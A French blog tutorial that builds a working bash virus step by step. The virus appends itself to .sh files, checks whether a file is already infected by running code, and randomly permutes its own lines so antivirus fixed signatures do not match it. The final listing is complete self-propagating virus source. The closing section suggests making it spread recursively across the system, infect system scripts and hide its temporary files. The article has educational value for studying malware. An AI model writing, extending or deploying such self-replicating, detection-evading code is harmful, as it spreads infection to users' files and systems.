Title: Programmez votre premier virus UNIX !
Order: 9
Date: 2014-09-27
Slug: programmez-votre-premier-virus-unix
Author: tcpc
Display: true

Le domaine de la **virologie Informatique** tient une place prépondérante de nos jours. Il suffit, pour s'en apercevoir d'observer le nombre de virus existant et des solutions anti-virales existantes (et de la part du marché qu'elles détiennent). Et paradoxalement, ce domaine reste très obscur, peu enseigné de manière officielle. Souvent perçu par le peuple comme un domaine très obscur, réservé aux petits génies et autres hackers, autant d'idées véhiculées très largement par les médias, la virologie est pourtant abordable par tous pour peu d'avoir quelques connaissances de base et beaucoup de motivation. De nombreux travaux universitaires ont par ailleurs été réalisés afin de mettre en lumière ce domaine et pouvoir l'aborder de manière rigoureuse. Les « virus » peuvent ainsi être décrits de manière totalement formelle afin d'être étudiés en profondeur et ce, de manière (très) théorique.

Mais commençons modestement et contentons-nous d'une petite introduction sur les virus Unix où nous aurons l'occasion de coder notre premier virus ! Je pense en effet que ce qui est excitant avec ce domaine, outre le fait qu'il soit perçu comme obscur, c'est qu'il est possible de bien s'amuser en bidouillant un peu et en se servant concrètement de son ordinateur. Bref, nulle théorie ne sera abordée dans ce premier article bien que je n'exclus pas l'idée d'en parler dans de prochains billets mais cela ne nous empêchera pas de commencer les choses sérieuses (de manière spontanée, j'ai l'impression qu'on peut aller très loin dans la pratique de la virologie sans connaître une once de théorie derrière, la pratique et la théorie me semblant être assez décorrélées).

Je tiens à préciser que vous pouvez exécuter tous les codes présents ici sans aucune crainte (exécutez-les cependant dans un dossier de tests, isolé du reste), ils ne sont pas malveillants (cet article ayant avant tout un but pédagogique). Lire l'article avec un Shell à côté serait même une très bonne idée pour assimiler ce qui va suivre et bien comprendre les choses (en vous amusant). Ne vous étonnez pas si l'exécution d'un code échoue parfois, lisez l'article !

# Définition et implémentation d'un virus
Avant de voir du code et de passer à la pratique, quelques petites notions de base en virologie s'imposent. Commençons par le commencement, qu'est-ce qu'un « virus » ?

Un virus, c'est tout simplement un **automate auto-reproducteur**. En bref, c'est juste un programme qui va se reproduire lui-même au fil de ses multiples exécutions. Il est intéressant de noter qu'un virus n'est donc fondamentalement pas nocif et malveillant comme on le conçoit d'ordinaire. Cela dit, quand il est exécuté sur un fichier dit *infecté*, il va se propager de fichier en fichier, s'auto-reproduisant pour finalement infecter tout le système puis passer à d'autres systèmes non infectés.

On peut donc dès à présent coder un tout petit virus minimaliste. Il s'agit d'un programme qui va s'auto-reproduire de cible en cible, i.e. qui va dupliquer son propre code source sur tous les fichiers infectés. Les fichiers exécutables en `.sh` constituent une bonne cible de départ. En effet, ayant déjà des droits d'exécution, on peut donc les infecter par un code qui s'exécutera sans aucun soucis lié aux permissions.

En utilisant la commande [tail](http://pwet.fr/man/linux/commandes/tail) on peut donc écrire par exemple :

```bash
for f in *.sh; do
  tail -n 3 $0 >> $f
done
```

Reste à savoir si c'est un virus efficace…

# Principes fondamentaux d'un virus
Maintenant qu'on a vu succinctement ce qu'est un virus, touchons trois mots à propos des antivirus (cela justifiera d'autant plus la suite de l'article). De manièrement informelle, on peut voir un antivirus comme un programme qui scanne le système de temps en temps et qui surveille de manière continue les points stratégiques (ports TCP et cie). Ce programme est chargé de trouver des anomalies qui pourraient révéler la présence de virus. Par exemple, notre précédent virus va infecter tous les fichiers en `.sh` du système en leur dupliquant son code source. L'antivirus, en scannant par exemple ces fichiers, va s'apercevoir qu'un motif récurrent apparaît. Il va consulter sa base de données et ainsi détecter la présence du dit virus. Autre exemple, l'exécution d'un programme alloue étrangement trop de mémoire ou prends trop de temps. L'antivirus va scanner en particulier le code de ce programme et trouvera sans doute le virus, au moyen toujours de sa base de données. Bien que simplistes, ces exemples donnent de petites idées sur le fonctionnement d'un antivirus.

Ainsi, afin d'assurer une bonne auto-reproduction, il existe trois concepts fondamentaux qui régissent le fonctionnement d'un virus afin que ce dernier ne se fassent pas trop vite repérer par un antivirus. À savoir :

* La **non-surinfection** : le virus ne doit pas infecter un fichier déjà infecté ! Si tel était le cas, on aurait des *boucles infinies* allouant quantité de mémoire et notre virus se ferait très vite détecter (en plus de ne pas fonctionner).

* Le **polymorphisme** : le virus doit changer de forme au cours de son auto-reproduction afin de ne pas constituer une signature fixe exploitable par un antivirus. Si il doit changer de forme, il ne doit surtout pas changer de fond ! Chaque auto-reproduction doit donc être équivalente bien que différente en apparence !

* La **furtivité** : le virus doit passer inaperçu aux yeux d'un antivirus et de son utilisateur !

Les deux premiers concepts sont abordés dans cet article, le troisième pourrait constituer un article futur.

Reprenons notre premier virus précédent et regardons si il vérifie les concept énoncés ci-dessus. Notre virus lutte-t-il contre la surinfection ? Non, un fichier cible déjà infecté se verra encore infecter si notre virus est exécuté. Notre virus est-t-il polymorphe ? Non plus, il est rigoureusement le même au fil des auto-reproductions. Et est-t-il furtif ? Je ne crois pas, son code source apparaissant en clair ! Bref, notre premier virus minimaliste est bien un virus mais il se fera très très vite attraper par le premier antivirus passant par-là...

Basons-nous sur cet exemple minimaliste pour construire un virus plus évolué au fil de l'article, en enrichissant nos trois lignes de code et surtout, en essayant de respecter les deux premiers principes vus ci-dessus !

# Conception d'un virus plus évolué
Commençons donc par nous interroger sur la question de la non-surinfection !

### Non-surinfection

Il s'agit donc de détecter la présence de notre virus dans un fichier cible afin de ne pas le ré-infecter. La première approche qui nous vient en tête est sans doute celle de la vérification par clé. En bref, une simple clé attesterai de la présence ou non du virus. Quelque chose dans l'esprit de :

```bash
if [ -z $(grep nkoazdpokdaznojazd cible.sh) ]; then
  continue
fi
...
```

Cependant cette méthode, bien que simple et très efficace pour la non-surinfection (on peut être certain que le virus ne sera pas dupliqué dans un fichier déjà infecté et ce, même si le virus se situe n'importe où) n'est pas du tout pertinente. Les antivirus ont un fonctionnement de base qui s'appuie sur des **signatures fixes**. Ils « lisent » l'infection proprement dite d'un virus, regardent les éléments qui demeurent constants au fil des reproductions du virus et les utilisent par la suite pour reconnaître le virus (via des fonctions de hashage et de grosses bases de données). Autrement dit, si un virus souhaite passer entre les mailles de ce premier filet, il ne doit pas laisser de signatures fixes dans ses infections ! Or notre clé de reconnaissance est justement une signature fixe… Bref, vous l'aurez compris, cette idée n'est pas satisfaisante pour notre projet.

Une autre méthode consisterait à chercher le code source exact du virus dans le fichier cible afin de vérifier sa présence mais c'est exactement la même idée que celle ci-dessus (modulo le fait que la clé devient plus longue, ce qui ne nous avance guère).

Il y a maintenant une solution plus élégante que celle proposée ci-dessus et surtout beaucoup plus efficace contre l'utilisation des signatures fixes par un antivirus. Il s'agit d'exécuter les X dernières lignes du fichier cible et d'observer le code de retour : si tout va bien, on obtient un `exit 0` et sinon une erreur (qu'on peut faire taire en redirigeant vers `/dev/null`). L'`exit 0` témoigne de la présence du virus (qui est donc exécuté) et l'erreur, de son absence.

Cela dit, cette idée fait quand même l'approximation que les X dernières exécutées renverront bien une erreur en cas d'absence du virus (ce qui peut ne pas être le cas dans la pratique, bien évidemment (X lignes constituées d'instructions comme `echo …` par exemple renverront un `exit 0`)). On pourra donc au préalable compter le nombre de lignes du fichier cible et si il est inférieur à celui de notre virus, directement infecter ce fichier (qui ne contient donc forcément pas notre virus). Et si notre fichier cible contient plus de X lignes, c'est que les X dernières lignes sont en théorie dépendantes des lignes précédentes et donc que leur exécution renverra une erreur.

Cette technique fonctionne donc a priori puisque l'antivirus n'a aucune signature fixe sur laquelle baser sa défense, la vérification de la non-surinfection se faisant dynamiquement, par exécution de code.

Notre virus contiendra donc dans un premier temps un petit test afin de savoir si l'exécution du fichier à infecter est effectuée pour vérifier la non-surinfection, en faisant par exemple `./cible.sh test` (l'argument test attestera de notre demande de vérification) :

```bash
if [ "$1" == "test" ]; then
  exit 0
fi
```

Puis dans un deuxième temps, on effectue le comptage de lignes du fichier cible comme décrit précedemment et ce, grâce à la fonction [wc](http://pwet.fr/man/linux/commandes/wc) et [cut](http://pwet.fr/man/linux/commandes/cut) puis on opère en fonction du résultat (par rapport à la longueur X de notre virus donc). Dans le cas où on doit tester les X dernières lignes, on récupère celle-ci via la fonction tail, on redirige le résultat dans un fichier nommé virus puis on exécute celui-ci en regardant la sortie. Un exit 0 provoquera un changement de cible, celle courante étant donc déjà infectée :

```bash
nbrlines=`wc -l $f | cut -f1 -d' '`
if [ $nbrlines -gt 16 ]; then
  tail -n X $cible > virus
  chmod +x virus
  ./.virus test > /dev/null 2>&1 && continue
fi
```

Les opérateurs de logique sont ici bien adaptés afin de connaître le code de retour d'une exécution. Pour un `cmd > /dev/null 2>&1 && cmd1 || cmd2`, `cmd1` sera exécutée si et seulement si `cmd` renvoie un `exit 0` et `cmd2` si et seulement si `cmd` échoue (et par ailleurs, `cmd` ne redirigera aucun résultat sur la sortie standard).

Maintenant que nous savons gérer de manière un peu plus correcte notre gestion de la non-surinfection, intéressons-nous au polymorphisme de notre virus !

### Polymorphisme

L'objectif de cette partie est de rendre théoriquement invisible l'auto-reproduction du virus aux yeux d'un antivirus.

Il ne s'agit pas de modifier intrinsèquement notre virus mais de le modifier dans la forme, en apparence, de façon à ce qu'il soit **strictement** équivalent à chaque reproduction. Après plusieurs réflexions, le concept de code mutant me paraît être assez efficace : le code source du virus va muter en se propageant de fichier en fichier. Il suffit par exemple d'effectuer une permutation aléatoire du code source de propagation en propagation afin de mettre en oeuvre cette mutation. (N'hésitez pas à me proposer vos idées de concepts de polymorphisme.)

Comment implémenter ce comportement en pratique ? Un obstacle se pose dès le départ, comment assurer la bonne exécution du virus si son code est permuté de façon aléatoire au fil de sa propagation ? Instinctivement, on se dit avoir besoin d'une fonction qui appliquera la permutation inverse au code lors de son exécution afin que toutes les instructions se déroule dans le bon ordre. Mais cette fonction appartient à notre virus, elle sera a priori elle-même permutée avec le reste du code. Mais pourquoi donc la permuter ? Fixons-là au début de notre virus et permutons le reste du code en dessous ! Mais cette fonction apparaîtra donc comme une signature fixe au yeux d'un antivirus…

Après ces quelques réflexions, le polymorphisme semblerait être au final un problème épineux. Il va nous falloir ruser pour contourner les quelques problèmes énoncés ci-dessus mais notre idée de base (permutation aléatoire du code du virus) est cependant bien la bonne, je vous rassure.

Essayons dans un premier temps d'implémenter notre polymorphisme de base : le virus va effectuer une permutation aléatoire de son code à chaque reproduction et une fonction placée en en-tête s'assurera de la permutation inverse afin d'exécuter le virus. On serait tenté de vouloir utiliser la fonction   [sort](http://pwet.fr/man/linux/commandes/sort) de base afin de ne pas ré-inventer la roue. C'est une bonne idée car elle facilite vraiment beaucoup la gestion de ces permutations. Un `man sort` vous permettra de vous renseigner sur les différents arguments possibles et il se trouve que certains d'entre eux nous intéressent ! Un `sort -R virus.sh` va par exemple permuter aléatoirement le code de notre virus ! Mais comment appliquer la permutation inverse puisque la permutation initiale étant aléatoire, on ne la connait pas ? Le terme même de "sort" devrait vous aiguiller, on va trier le code source de notre virus à l'aide de `sort` ! Sans argument, `sort` triera tout notre code en fonction du premier caractère de chaque ligne, ça n'est pas très intéressant. L'astuce est donc de forcer `sort` à trier notre code de façon numérique mais pour cela il nous faut des nombres dans notre code. **Merveilleuse existence des commentaires !**

On va numéroter chaque ligne de notre virus à l'aide des commentaires, quelque chose comme : `# @7` pour la septième ligne, par exemple. Il nous suffira ensuite d'appliquer un `sort -R virus.sh` pour permuter aléatoirement notre virus, comme expliqué précedemment, puis un `sort -n -t@ -k2 virus.sh` pour remettre en place notre virus (`-n` signifie qu'on trie numériquement, `-t` indique le séparateur qu'on utilise pour indiquer les nombres à utiliser et `-k` sélectionne le côté de la séparation qui nous intéresse (appliquer un `-t@` coupera `# @7` en deux, d'un côté `#`, de l'autre `7` (c'est donc le deuxième côté qui nous intéresse))).

Commençons un peu à coder (sans nous préoccuper d'intégrer maintenant notre code de non-surinfection) :

```bash
tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus
for f in *.sh; do # @1
  echo 'tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus' >> $f # @2
  tail -n 4 $0 | sort -R >> $f # @3
done # @4
```

Je n'ai pas grand chose à ajouter, la première ligne constitue notre fonction qui va remettre en ordre le code du virus au-dessous d'elle (qui est potentiellement permuté) puis l'exécuter. Le virus va ensuite, pour chaque cible en `.sh`, ajouter cette fonction au fichier à infecter puis ajouter les quatre dernières lignes de son code, permutées par sort.

Voici un fichier cible d'exemple :

```bash
echo 'Ceci est un fichier infecté. :('
```

L'exécution de notre virus précédent va infecter ce fichier cible comme cela, par exemple :

```bash
echo 'Ceci est un fichier infecté. :('
tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus
  echo 'tail -n 4 $0 | sort -n -t@ -k2 > virus && chmod +x virus && ./virus' >> $f # @2
done # @4
  tail -n 4 $0 | sort -R >> $f # @3
for f in *.sh; do # @1
```

(Et l'exécution de ce fichier infecté va suivre le comportement décrit juste ci-dessus.)

Afin d'améliorer notre polymorphisme, il serait intéressant de permuter la position de la première ligne (la fonction de permutation inverse) en même temps que le reste du code. Cela pose cependant un gros problème, comment appliquer alors la permutation inverse ?

La solution se trouve encore… dans les commentaires ! Eh oui, en commentant tout le virus sauf la fonction de permutation inverse, on peut permuter à souhait le code entier et son exécution commencera donc forcément par notre fonction de permutation inverse (puisque le reste du code est un commentaire). Il faudra simplement décommenter notre code en le triant puis l'exécuter. On va utiliser ici les commandes [sed](http://pwet.fr/man/linux/commandes/sed) et `cut` pour respectivement commenter et décommenter notre code. Le commenter est plus délicat car il s'agit de rajouter `#` à chaque début de ligne. C'est ici que rentre en jeu la très puissante commande `sed` qui, en quelques mots, manipule des fichiers ligne par ligne selon les instructions de l'utilisateur (le plus souvent sous forme de regex). Je vous laisse consulter le manuel, notre utilisation se résumant à un `sed -i "s/^/# /"` (l'argument `-i` indique l'ajout de caractères à une ligne et la `regex s/^/#` indique qu'on rajoute `#` à chaque début de ligne (`^`)). La commande `cut` va s'utiliser avec l'argument `-c` qui indique qu'on considère notre code comme un tableau auquel on choisit les colonnes à afficher. En commentant, on ajoute un dièse et un espace (colonne 1 et 2), on va donc sélectionner tout le code à partir de la colonne 3 ce qui se fait comme ceci : `cut -c3- virus`. Il faut enfin changer la position de la première ligne dans le fichier cible et ce, toujours avec la commande `sed` utilisée comme ceci : `sed -i "/POSITION/ i\PREMIERE LIGNE"` (on insère la `PREMIERE LIGNE` au-dessus de la `POSITION-ième` ligne et ce, aléatoirement ; consultez le manuel pour plus de précisions).

Modifions un peu notre code précédent :

```bash
tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 > virus && chmod +x virus && ./virus
# for f in *.sh; do # @1
#   tail -n 6 $0 | sort -R > infection # @2
#   sed -i "s/^/# /" infection # @3
#   sed -i "/$[ RANDOM % 7 ] i\tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 > virus && chmod +x virus && ./virus" infection #@4
#   cat infection >> $f # @5
# done # @6
```

En exécutant ce code, vous obtiendrez sans doute une erreur vous signifant que « La commande -il n'existe pas. ». « il », « tail », cela se ressemble, non ? Il semblerait que nous ayons fait une erreur de raisonnement. En appliquant la commande `cut -c3-` au fichier infecté avant le tri des dernières lignes, afin de décommenter le code, on oublie que la fonction de permutation inverse n'est pas commentée et donc qu'on coupe la commande `tail` en commençant par la colonne 3. Une astuce ? Rajouter deux espaces pour s'aligner sur le code commenté ! (On peut tout aussi bien changer la position de `cut -c3-` pour la mettre après `sort -n -t@ -k2` puisqu'il s'agit en fait de l'ordre des commandes qui n'est pas anodin.)

Il y a cependant une autre erreur de raisonnement. En effet, si vous exécutez ce code, il n'infectera aucun fichier. En effet, dans la première ligne nous récupérons le virus entier via `tail -n 7 $0` puis nous mettons le code ordonné dans un fichier virus que nous exécutons. Mais le fichier virus exécuté contient exactement la même première ligne que ci-dessus… On va donc toujours rester bloqué à la première ligne. Suffirait-il de modifier le `tail -n 7` en `tail -n 6` ? Eh non, car notre première ligne peut potentiellement se retrouver ailleurs puisque le code du virus est permuté et il faut donc bien récupérer les 7 lignes (i.e. le virus entier). L'astuce consiste à rajouter un `tail -n 6` à la suite.

Au final :

```bash
  tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 | tail -n 6 > virus && chmod +x virus && ./virus
# for f in *.sh; do # @1
#   tail -n 6 $0 | sort -R > infection # @2
#   sed -i "s/^/# /" infection # @3
#   sed -i "/$[ RANDOM % 7 ] i\  tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 | tail -n 6 > virus && chmod +x virus && ./virus" infection #@4
#   cat infection >> $f # @5
# done # @6
```

Il y a cependant, un autre soucis. Eh oui, c'est le problème avec ce genre de programme qui se « mord la queue », à première vue on ne pense pas forcément à toutes les subtilités ! (Remarquez que ça rend la chose d'autant plus intéressante.) A priori, notre virus permuté ne sera jamais trié dans l'ordre convenable. C'est pourtant étonnant, non ? Je ne pense pas avoir dis de bêtises et la commande sort est quand même fiable je suppose. Le problème vient pourtant bien de notre tri. Rappelez-vous, nous trions le code permuté grâce à la commande `sort -n -t@ -k2` et `@` est donc le séparateur censé précéder le numéro de la ligne courante. Observez bien le code… Le symbole `@` est utilisé ailleurs et c'est cela qui perturbe le fonctionnement de notre tri. Arrivé à ce constat, j'avoue avoir été un peu dégoûté, bloqué si proche du but. La solution la plus facile consisterai à représenter le `@` d'une autre manière. Merci Bash et sa possibilité d'exécuter des commandes via ``` `` ``` ! Servons nous par exemple de la représentation hexadécimale. `@` est encodé par le nombre `40`, il ne reste plus qu'à remplacer les `@` intempestifs par des `printf "\x40\n"` :

```bash
  tail -n 7 $0 | cut -c3- | sort -n -t`printf "\x40\n"` -k2 | tail -n 6 > virus && chmod +x virus && ./virus
# for f in *.sh; do # @1
#   tail -n 6 $0 | sort -R > infection # @2
#   sed -i "s/^/# /" infection # @3
#   sed -i "/$[ RANDOM % 7 ] i\  tail -n 7 $0 | cut -c3- | sort -n -t`printf "\x40\n"` -k2 | tail -n 6 > virus && chmod +x virus && ./virus" infection #@4
#   cat infection >> $f # @5
# done # @6
```

Enfin un code qui fonctionne !

### Bilan et améliorations

Après avoir bien amélioré notre virus minimaliste de départ qui tenait, je vous le rappelle, en trois lignes, voilà notre virus polymorphe final :

```bash
  tail -n 15 $0 | cut -c3- | sort -n -t`printf "\x40\n"` -k2 | tail -n 14 > virus && chmod +x virus && ./virus
# if [ "$1" == "test" ]; then # @1
#   exit 0 # @2
# fi # @3
# for f in *.sh; do # @4
#   nbrlines=`wc -l $f | cut -f1 -d' '` # @5
#   if [ $nbrlines -gt 14 ]; then # @6
#     tail -n 15 $f | cut -c3- | sort -n -t`printf "\x40\n"` -k2 | tail -n 14 > test && chmod +x test # @7
#     ./test test > /dev/null 2>&1 && continue # @8
#   fi # @9
#   tail -n 14 $0 | sort -R > infection # @10
#   sed -i "s/^/# /" infection # @11
#   sed -i "/$[ RANDOM % 15 ]/ i\  tail -n 15 $0 | cut -c3- | sort -n -t`printf "\x40\n"` -k2 | tail -n 14 > virus && chmod +x virus && ./virus" infection #@12
#   cat infection >> $f # @13
# done # @14
```

Nous nous arrêterons là mais voici quelques améliorations possibles afin de vous exercez tout seul :

* On utilise des fichiers intermédiaires `virus`, `test` et `infection` afin d'ordonner le code permuté du virus présent dans un fichier infecté, l'exécuter et reproduire le virus (car sed a notamment besoin qu'on lui passe un fichier en argument). Ce n'est pas très discret, vous pourriez améliorer cela (petite indication : servez-vous de /tmp/).

* Notre virus n'infecte que les fichiers du répertoire courant. Essayez d'étendre ce comportement afin d'explorer récursivement tout le système !

* Notre virus n'infecte que les fichiers en `.sh`, il serait t'intéressant d'étendre son infection aux scripts du système.

* Vous pouvez aussi vous amuser à jouer avec la furtivité du virus : essayez d'accélérer son fonctionnement (en utilisant le moins d'écriture disque intermédiaire possible) afin de rendre son exécution la brève possible et donc de passer plus inaperçu en cas de traitement de milliers de fichiers. Vous pouvez au contraire rendre son exécution beaucoup plus lente afin d'améliorer sa survie, etc.

Au fil de cet article, nous avons pu étudier un peu deux des trois principaux concepts qui régissent les virus et ce, en aboutissant à un petit virus polymorphe. Afin de comprendre en profondeur tous les codes qui se trouvent dans cet article (si vous avez un peu de mal), il me paraît essentiel de pratiquer un peu afin de vous rendre compte vous-même des problèmes pratiques que peut poser le polymorphisme, par exemple, et des solutions que vous pouvez trouver pour les résoudre. N'hésitez pas à partager vos expériences dans les commentaires !

Certains d'entre vous seront peut-être déçus par cette modeste introduction qui présente des principes généraux à la base des virus mais dans le cas un peu particulier d'une implémentation en Bash. Je vous avoue que je n'ai pas encore réfléchi en profondeur au problème du polymorphisme, par exemple, dans le cas général. Intuitivement, je dirai qu'il faudrait se pencher sur la théorie afin de pouvoir traiter ce cas général. Peut-être faut-il également s'intéresser aux [quines](http://fr.wikipedia.org/wiki/Quine_(informatique)) multi-langages, qui paraît être une voie intéressante (puisque mine de rien, on utilise un quine en Bash qu'on permute par la suite). Bref, je compte m'intéresser à cette question et peut-être que je rédigerai un prochain article sur le sujet. Pour l'heure, je pense encore avancer en développant un peu plus notre virus (notamment en m'intéressant à la furtivité du virus et à sa charge utile (nous en reparlerons)) et en faire un prochain billet.


*Cet article est issu de mon [blog](http://tcpc.isomorphis.me/blog/), retrouvez-y des articles bonus et autres joyeusetés ! [Suivez-moi](https://twitter.com/tcpc_) sur Twitter afin d'être tenu au courant des derniers articles.*
